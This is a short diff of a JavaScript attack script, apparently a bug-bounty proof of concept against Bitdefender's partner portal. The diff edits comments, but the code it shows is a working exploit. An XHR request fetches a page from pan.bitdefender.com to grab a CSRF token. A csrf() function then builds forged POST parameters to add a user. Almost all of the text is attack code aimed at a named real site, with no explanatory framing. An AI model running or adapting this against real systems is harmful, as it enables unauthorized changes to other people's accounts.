@@ -22,7 +22,7 @@ function readBody(xhr) {
     return [data, data1];
 }
 
-// Creates and sends the initial XHR request to the UsersPending page: this is to obtain the CSRF token
+// Creates and sends the initial XHR request to the Users page: this is to obtain the CSRF token
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function () {
     if (xhr.readyState == 4) {
@@ -34,7 +34,7 @@ xhr.open("GET", "https://pan.bitdefender.com/partners/my-users-save/", true);
 xhr.send(null);
 
 
-// Sends the CSRF attack to POST data to the UsersPending section, using the previously obtained CSRF token
+// Sends the CSRF attack to POST data to the Users Add section, using the previously obtained CSRF token
 function csrf(token, key) {
     var params = "_Token%5Bfields%5D=" + token;
     params += "&fname=hamdolah&";
